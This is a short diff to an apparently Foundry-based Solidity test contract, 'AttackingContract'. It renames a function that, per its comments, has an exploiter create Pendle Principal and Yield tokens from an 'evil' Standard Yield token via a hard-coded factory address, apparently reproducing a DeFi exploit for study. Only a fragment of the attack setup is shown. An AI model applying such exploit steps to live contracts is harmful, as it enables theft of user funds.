@@ -29,8 +29,7 @@ contract AttackingContract is Test {
         balanceOf[to] += amount;
     }
 
-
-    function createEvilPendleMarket() external {
+    function test_createEvilPendleMarket() external {
         // Exploiter creates a Principal Token and a Yield Token on Pendle
         // using his evil Standard Yield token.
         (address PT, address YT) = PendleYieldContractFactory(0x35A338522a435D46f77Be32C70E215B813D0e3aC)
